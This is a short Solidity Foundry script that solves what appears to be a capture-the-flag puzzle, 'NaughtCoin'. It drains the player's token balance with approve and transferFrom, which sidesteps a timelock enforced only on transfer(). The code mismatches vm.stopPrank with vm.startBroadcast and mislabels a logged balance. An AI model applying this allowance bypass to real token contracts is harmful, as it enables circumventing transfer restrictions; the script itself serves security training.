// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {NaughtCoin} from "../../src/puzzles/15/NaughtCoin.sol";

contract NaughtCoinSolution is Script {
    function run(address target) external {
        NaughtCoin puzzleContract = NaughtCoin(target);
        uint256 playerBalance = puzzleContract.balanceOf(msg.sender);

        vm.startBroadcast();
        puzzleContract.approve(msg.sender, playerBalance);
        puzzleContract.transferFrom(msg.sender, address(puzzleContract), playerBalance);
        vm.stopPrank();

        console.log("Player address: ", puzzleContract.balanceOf(msg.sender));
    }
}
